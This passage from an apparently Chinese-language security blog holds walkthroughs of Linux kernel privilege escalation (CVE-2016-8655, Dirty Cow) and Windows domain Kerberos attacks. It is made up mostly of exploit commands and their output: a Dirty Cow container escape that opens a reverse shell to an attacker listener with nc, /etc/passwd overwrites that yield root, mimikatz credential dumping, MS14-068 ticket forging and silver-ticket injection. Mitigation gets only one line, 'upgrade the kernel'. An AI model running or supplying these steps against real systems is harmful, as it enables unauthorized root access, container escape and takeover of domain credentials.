class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">$ ./chocobo_root </span><br><span class="line">linux AF_PACKET race condition exploit by rebel</span><br><span class="line">kernel version: 4.4.0-51-generic <span class="comment">#72</span></span><br><span class="line">proc_dostring = 0xffffffff81088090</span><br><span class="line">modprobe_path = 0xffffffff81e48f80</span><br><span class="line">register_sysctl_table = 0xffffffff812879a0</span><br><span class="line">set_memory_rw = 0xffffffff8106f320</span><br><span class="line">exploit starting</span><br><span class="line">making vsyscall page writable..</span><br><span class="line"></span><br><span class="line">new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000</span><br><span class="line">sockets allocated</span><br><span class="line">removing barrier and spraying..</span><br><span class="line">version switcher stopping, x = -1 (y = 204517, last val = 0)</span><br><span class="line">current packet version = 2</span><br><span class="line">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span><br><span class="line">race not won</span><br><span class="line"></span><br><span class="line">retrying stage..</span><br><span class="line">new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000</span><br><span class="line">sockets allocated</span><br><span class="line">removing barrier and spraying..</span><br><span class="line">version switcher stopping, x = -1 (y = 105697, last val = 2)</span><br><span class="line">current packet version = 0</span><br><span class="line">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span><br><span class="line">*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*</span><br><span class="line">please <span class="built_in">wait</span> up to a few minutes <span class="keyword">for</span> timer to be executed. <span class="keyword">if</span> you ctrl-c now the kernel will hang. so don<span class="string">&#x27;t do that.</span></span><br><span class="line"><span class="string">closing socket and verifying.......</span></span><br><span class="line"><span class="string">vsyscall page altered!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">stage 1 completed</span></span><br><span class="line"><span class="string">registering new sysctl..</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850</span></span><br><span class="line"><span class="string">sockets allocated</span></span><br><span class="line"><span class="string">removing barrier and spraying..</span></span><br><span class="line"><span class="string">version switcher stopping, x = -1 (y = 125059, last val = 2)</span></span><br><span class="line"><span class="string">current packet version = 0</span></span><br><span class="line"><span class="string">pbd-&gt;hdr.bh1.offset_to_first_pkt = 48</span></span><br><span class="line"><span class="string">*=*=*=* TPACKET_V1 &amp;&amp; offset_to_first_pkt != 0, race won *=*=*=*</span></span><br><span class="line"><span class="string">please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don&#x27;</span>t <span class="keyword">do</span> that.</span><br><span class="line">closing socket and verifying.......</span><br><span class="line">sysctl added!</span><br><span class="line"></span><br><span class="line">stage 2 completed</span><br><span class="line">binary executed by kernel, launching rootshell</span><br><span class="line">root@wuala:/opt/CVE-2016-8655-master<span class="comment"># id </span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(<span class="built_in">test</span>)</span><br><span class="line">root@wuala:/opt/CVE-2016-8655-master<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@wuala:/opt/CVE-2016-8655-master<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>升级到最新版本内核。</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux提权 </tag>
            
            <tag> CVE-2016-8655 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dirty Cow</title>
      <link href="/2021/12/20/Dirty-Cow/"/>
      <url>/2021/12/20/Dirty-Cow/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>Dirty Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。</p><span id="more"></span><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>Linux中利用Dirty Cow 和 docker中利用Dirty Cow的区别</p><p>Linux：漏洞具体为，get_user_page内核函数在处理Copy-on-Write(以下使用COW表示)的过程中，可能产出竞态条件造成COW过程被破坏，导致出现写数据到进程地址空间内只读内存区域的机会。修改su或者passwd程序就可以达到root的目的。具体分析请查看官方分析。</p><p>Docker：在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p><p>利用POC：</p><p>Linux：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">官方POC：https://github.com/dirtycow/dirtycow.github.io</span><br><span class="line">提权POC：https://github.com/FireFart/dirtycow</span><br><span class="line">提权POC：https://github.com/gbonacini/CVE-2016-5195</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Docker:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">逃逸POC：https://github.com/gebl/dirtycow-docker-vdso</span><br></pre></td></tr></table></figure><p><strong>漏洞利用条件</strong></p><p>docker与宿主机共享内核，如果要触发这个漏洞，需要宿主机存在dirtyCow漏洞的宿主机。（测试中发现在宿主机版本为ubuntu-14.04.5可以成功利用poc，在宿主机版本为Ubuntu 18.04.6 LTS时利用失败，提示：Segmentation fault）</p><p>The program was successfully used with:</p><ul><li>RHEL7 Linux x86_64;</li><li>RHEL4 (4.4.7-16, with “legacy” version)</li><li>Debian 7 (“wheezy”);</li><li>Ubuntu 14.04.1 LTS</li><li>Ubuntu 14.04.5 LTS</li><li>Ubuntu 16.04.1 LTS</li><li>Ubuntu 16.10</li><li>Linux Mint 17.2</li></ul><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>Docker 逃逸漏洞利用过程：</p><p>查看版本：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">宿主机：</span><br><span class="line">root@ubuntu:~<span class="comment"># uname -a </span></span><br><span class="line">Linux ubuntu 4.4.0-31-generic <span class="comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">root@ubuntu:~<span class="comment"># uname -r </span></span><br><span class="line">4.4.0-31-generic</span><br><span class="line"></span><br><span class="line">容器：</span><br><span class="line">root@1447b7d06488:/<span class="comment"># uname -a  </span></span><br><span class="line">Linux 1447b7d06488 4.4.0-31-generic <span class="comment">#50~14.04.1-Ubuntu SMP Wed Jul 13 01:07:32 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">root@1447b7d06488:/<span class="comment"># uname -r </span></span><br><span class="line">4.4.0-31-generic</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在容器中下载利用poc，并编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/gebl/dirtycow-docker-vdso.git</span><br><span class="line"><span class="built_in">cd</span> /dirtycow-vdso/</span><br><span class="line">make</span><br></pre></td></tr></table></figure><p><img src="image-20211123145827599.png"></p><p>攻击机监听端口，容器执行poc并成功接收到宿主机的shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">攻击机：</span><br><span class="line">nc -l 4444</span><br><span class="line"></span><br><span class="line">容 器：</span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># make </span></span><br><span class="line">nasm -f bin -o payload payload.s</span><br><span class="line">xxd -i payload payload.h</span><br><span class="line">cc -o 0xdeadbeef.o -c 0xdeadbeef.c -Wall</span><br><span class="line">cc -o 0xdeadbeef 0xdeadbeef.o -lpthread</span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># ls</span></span><br><span class="line">0xdeadbeef  0xdeadbeef.c  0xdeadbeef.o  LICENSE  Makefile  README.md  payload  payload.h  payload.s  tools</span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># </span></span><br><span class="line">root@72b3d24fadde:/dirtycow-vdso-master<span class="comment"># ./0xdeadbeef 10.0.4.68:4444 </span></span><br><span class="line">[*] payload target: 10.0.4.68:4444</span><br><span class="line">[*] exploit: patch 1/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] exploit: patch 2/2</span><br><span class="line">[*] vdso successfully backdoored</span><br><span class="line">[*] waiting <span class="keyword">for</span> reverse connect shell...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="image-20211123145956774.png"></p><p><img src="image-20211123151310761.png"></p><p><img src="image-20211123151333801.png"></p><p>成功获取宿主机的shell</p><h3 id="Linux–脏牛提权内容"><a href="#Linux–脏牛提权内容" class="headerlink" title="Linux–脏牛提权内容"></a>Linux–脏牛提权内容</h3><p>dcow 可能是对漏洞 CVE-2016-5195 的利用。在易受攻击的系统上以非特权用户身份运行该程序，它将修改 /etc/passwd 文件,在成功执行的情况下，使用该密码执行“su”，root shell 将可用。</p><p>普通用户将exp一下载到本地，使用<code>gcc -pthread dirty.c -o dirty -lcrypt</code>命令对dirty.c进行编译，生成一个dirty的可执行文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#查看当前用户</span></span><br><span class="line">$ id</span><br><span class="line">uid=1001(<span class="built_in">test</span>) gid=1001(<span class="built_in">test</span>) groups=1001(<span class="built_in">test</span>)</span><br><span class="line">$ whoami</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line"><span class="comment">#下载exp并编译</span></span><br><span class="line">$ git <span class="built_in">clone</span> https://github.com/FireFart/dirtycow</span><br><span class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">$ ls</span><br><span class="line">dirty  dirty.c  README.md</span><br><span class="line"><span class="comment">#执行exp</span></span><br><span class="line">$ ./dirty mypassword</span><br><span class="line">/etc/passwd successfully backed up to /tmp/passwd.bak</span><br><span class="line">Please enter the new password: mypassword</span><br><span class="line">Complete line:</span><br><span class="line">firefart:fiW.uD9O/GMV2:0:0:pwned:/root:/bin/bash</span><br><span class="line"></span><br><span class="line">mmap: 7f169daa8000</span><br></pre></td></tr></table></figure><p><img src="image-20211123152145543.png"></p><p><img src="image-20211123152629735.png"></p><p>通过su - firefart 并输入密码：mypassword，获取root权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ su - firefart   </span><br><span class="line">Password: </span><br><span class="line">firefart@wuala:~<span class="comment"># id</span></span><br><span class="line">uid=0(firefart) gid=0(root) groups=0(root)</span><br><span class="line">firefart@wuala:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><p><img src="image-20211123153723931.png"></p><p>恢复方式，将/tmp/passwd.bak 恢复到/etc/passwd </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">firefart@wuala:~<span class="comment"># mv /tmp/passwd.bak  /etc/passwd </span></span><br><span class="line">firefart@wuala:~<span class="comment"># exit </span></span><br><span class="line"><span class="built_in">logout</span></span><br><span class="line">su: User not known to the underlying authentication module</span><br><span class="line">$ <span class="built_in">exit</span></span><br><span class="line">root@wuala:/tmp<span class="comment"># </span></span><br></pre></td></tr></table></figure><h3 id="第二种方式"><a href="#第二种方式" class="headerlink" title="第二种方式"></a>第二种方式</h3><p>下载poc脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">下载脚本并编译</span><br><span class="line">https://github.com/gbonacini/CVE-2016-5195</span><br><span class="line"></span><br><span class="line">$ whoami</span><br><span class="line"><span class="built_in">test</span></span><br><span class="line">$ ./dcow -s </span><br><span class="line">Running ...</span><br><span class="line">Password overridden to: dirtyCowFun</span><br><span class="line"></span><br><span class="line">Received su prompt (Password: )</span><br><span class="line"></span><br><span class="line">root@wuala:~<span class="comment"># echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span></span><br><span class="line">root@wuala:~<span class="comment"># \cp /tmp/.ssh_bak /etc/passwd</span></span><br><span class="line">root@wuala:~<span class="comment"># \rm /tmp/.ssh_bak</span></span><br><span class="line">root@wuala:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@wuala:~<span class="comment"># </span></span><br></pre></td></tr></table></figure><p><img src="image-20211123160033099.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 云原生 </tag>
            
            <tag> linux提权 </tag>
            
            <tag> CVE-2016-5195 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网PTT</title>
      <link href="/2021/12/20/%E5%86%85%E7%BD%91PTT/"/>
      <url>/2021/12/20/%E5%86%85%E7%BD%91PTT/</url>
      
        <content type="html"><![CDATA[<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>ptt攻击的部分就不是简单的NTLM认证了，它是利用Kerberos协议进行攻击的，这里就介绍三种常见的攻击方法：</p><p>MS16-068，Golden ticket，SILVER ticket。</p><span id="more"></span><p>之前介绍了Kerberos协议具体工作方法，在域中，简要介绍一下：</p><ul><li>客户机将明文密码进行NTLM哈希,然后和时间戳一起加密(使用krbtgt密码hash作为密钥)，发送给kdc（域控），kdc对用户进行检测，成功之后创建TGT(Ticket-Granting Ticket)</li><li>将TGT进行加密签名返回给客户机器，只有域用户krbtgt才能读取kerberos中TGT数据</li><li>然后客户机将TGT发送给域控制器KDC请求TGS（票证授权服务）票证，并且对TGT进行检测</li><li>检测成功之后，将目标服务账户的NTLM以及TGT进行加密，将加密后的结果返回给客户机。</li></ul><h3 id="ms14-068"><a href="#ms14-068" class="headerlink" title="ms14-068"></a>ms14-068</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中插入任意PAC（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。用户可以通过呈现具有改变的PAC的Kerberos TGT来获得票证.</span><br><span class="line"></span><br><span class="line">windows域中使用kerberos协议过程中，为了让SS服务器判断Client是否有权限访问服务，引入了PAC机制。构造PAC也是这个漏洞的根本。</span><br><span class="line">1. 在请求AS时，将require_PAC设置成False。</span><br><span class="line">2. 在请求TGS时，构造PAC，然后使用MD5签名（PAC尾部的签名算法可以任意指定），PAC并没有放在TGT中发送，而是在请求包的其他位置（但是还是可以解析）。</span><br><span class="line">3. TGS_REP返回的不是会话密钥，而是返回的带PAC的TGT（微软的锅）</span><br></pre></td></tr></table></figure><p>造成的危害是允许域内任何一个普通用户，将自己提升至域管权限。微软给出的补丁是kb3011780</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo |find &quot;3011780&quot;</span><br></pre></td></tr></table></figure><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>涉及系统：Windows Server 2003<br>Windows Vista<br>Windows Server 2008<br>Windows 7<br>Windows Server 2008 R2<br>Windows 8 and Windows 8.1<br>Windows Server 2012 and Windows Server 2012 R2<br>Server Core installation option</p><h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><p>1.使用whoami /user得到普通域用户的sid</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名       SID</span><br><span class="line">============ ==============================================</span><br><span class="line">lab\cve-test S-1-5-21-1799307087-3941118632-1964125693-2102</span><br><span class="line"></span><br><span class="line">C:\Users\cve-test&gt;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>2.利用工具 <a href="https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068">ms14-068</a></p><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码</span><br></pre></td></tr></table></figure><p>运行实例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MS14-068.exe -u cve-test@lab.com -s S-1-5-21-1799307087-3941118632-1964125693-2102 -d 192.168.100.30 -p 123.com</span><br></pre></td></tr></table></figure><p>输出内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\win7\Desktop&gt;MS14-068.exe -u cve-test@lab.com -s S-1-5-21-1799307087-3941118632-1964125693-2102 -d 192.168.100.30 -p 123.com</span><br><span class="line">  [+] Building AS-REQ <span class="keyword">for</span> 192.168.100.30... Done!</span><br><span class="line">  [+] Sending AS-REQ to 192.168.100.30... Done!</span><br><span class="line">  [+] Receiving AS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Parsing AS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Building TGS-REQ <span class="keyword">for</span> 192.168.100.30... Done!</span><br><span class="line">  [+] Sending TGS-REQ to 192.168.100.30... Done!</span><br><span class="line">  [+] Receiving TGS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Parsing TGS-REP from 192.168.100.30... Done!</span><br><span class="line">  [+] Creating ccache file <span class="string">&#x27;TGT_cve-test@lab.com.ccache&#x27;</span>... Done!</span><br></pre></td></tr></table></figure><p>3.票据注入</p><p>使用mimikatz将票据注入到当前内存中，伪造凭证，如果成功则拥有域管理权限，可任意访问域中所有机器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge         //清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="line">mimikatz # kerberos::list          //查看当前机器凭证</span><br><span class="line">mimikatz # kerberos::ptc 票据文件   //将票据注入到内存中</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\win7\Desktop\mimikatz_trunk1 2\x64&gt;mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .<span class="comment">#####.   mimikatz 2.2.0 (x64) #19041 Jul  9 2021 22:59:41</span></span><br><span class="line"> .<span class="comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span></span><br><span class="line"> <span class="comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span></span><br><span class="line"> <span class="comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span></span><br><span class="line"> <span class="string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  <span class="string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line"></span><br><span class="line">[00000000] - 0x00000017 - rc4_hmac_nt</span><br><span class="line">   Start/End/MaxRenew: 2021/12/17 10:54:07 ; 2021/12/17 20:54:06 ; 2021/12/24 10:54:06</span><br><span class="line">   Server Name       : krbtgt/LAB.COM @ LAB.COM</span><br><span class="line">   Client Name       : cve-test @ LAB.COM</span><br><span class="line">   Flags 50a10000    : name_canonicalize ; pre_authent ; renewable ; proxiable ; forwardable ;</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::purge</span></span><br><span class="line">Ticket(s) purge <span class="keyword">for</span> current session is OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::list</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># kerberos::ptc TGT_cve-test@lab.com.ccache</span></span><br><span class="line"></span><br><span class="line">Principal : (01) : cve-test ; @ LAB.COM</span><br><span class="line"></span><br><span class="line">Data 0</span><br><span class="line">           Start/End/MaxRenew: 2021/12/17 10:57:51 ; 2021/12/17 20:57:51 ; 2021/12/24 10:57:51</span><br><span class="line">           Service Name (01) : krbtgt ; LAB.COM ; @ LAB.COM</span><br><span class="line">           Target Name  (01) : krbtgt ; LAB.COM ; @ LAB.COM</span><br><span class="line">           Client Name  (01) : cve-test ; @ LAB.COM</span><br><span class="line">           Flags 50a10000    : name_canonicalize ; pre_authent ; renewable ; proxiable ; forwardable ;</span><br><span class="line">           Session Key       : 0x00000017 - rc4_hmac_nt</span><br><span class="line">             8f1c17519f93dab38a391bc832a477d5</span><br><span class="line">           Ticket            : 0x00000000 - null              ; kvno = 2        [...]</span><br><span class="line">           * Injecting ticket : OK</span><br><span class="line"></span><br><span class="line">mimikatz <span class="comment"># exit</span></span><br><span class="line">Bye!</span><br></pre></td></tr></table></figure><p>注入票据后，可以使用dir \x.x.x.x\c$ 来访问域控（后续利用参考，wmic等方式）</p><h3 id="白银票据（Silver-ticket）"><a href="#白银票据（Silver-ticket）" class="headerlink" title="白银票据（Silver ticket）"></a>白银票据（Silver ticket）</h3><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p>silver ticket和golden ticket不同的是,它不需要和域控制器进行通信，原理是伪造TGS，使用的是计算机账户的hash进行加密的，所以只能访问指定的权限。</p><p>首先需要目标的机器账号hash。然后在进行伪造权限，进行ptt</p><p>目标机器为win2008，攻击机器为win7</p><p>1.使用mimikatz获取到win2008的机器账号(WIN2008$)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">mimikatz(commandline) <span class="comment"># privilege::debug</span></span><br><span class="line">Privilege <span class="string">&#x27;20&#x27;</span> OK</span><br><span class="line"></span><br><span class="line">mimikatz(commandline) <span class="comment"># sekurlsa::logonpasswords</span></span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 996 (00000000:000003e4)</span><br><span class="line">Session           : Service from 0</span><br><span class="line">User Name         : WIN2008$</span><br><span class="line">Domain            : LAB</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2021/12/16 13:11:16</span><br><span class="line">SID               : S-1-5-20</span><br><span class="line">msv :</span><br><span class="line"> [00000003] Primary</span><br><span class="line"> * Username : WIN2008$</span><br><span class="line"> * Domain   : LAB</span><br><span class="line"> * NTLM     : f78dd9e2f973830056e39dff42af4930</span><br><span class="line"> * SHA1     : b44b0b6700f297142b5e635ceb5b8ae6dcf9cae5</span><br><span class="line">tspkg :</span><br><span class="line">wdigest :</span><br></pre></td></tr></table></figure><p>2.在普通域用户机器中进行ptt</p><p>获取SID,票据利用中不需要SID最后几位的身份识别码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\cve-test&gt;whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名       SID</span><br><span class="line">============ ==============================================</span><br><span class="line">lab\cve-test S-1-5-21-1799307087-3941118632-1964125693-2102</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行ptt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /domain:lab.com /sid:S-1-5-21-1799307087-3941118632-1964125693  /target:win2008.lab.com /rc4:f78dd9e2f973830056e39dff42af4930  /service:cifs /user:mary /ptt</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 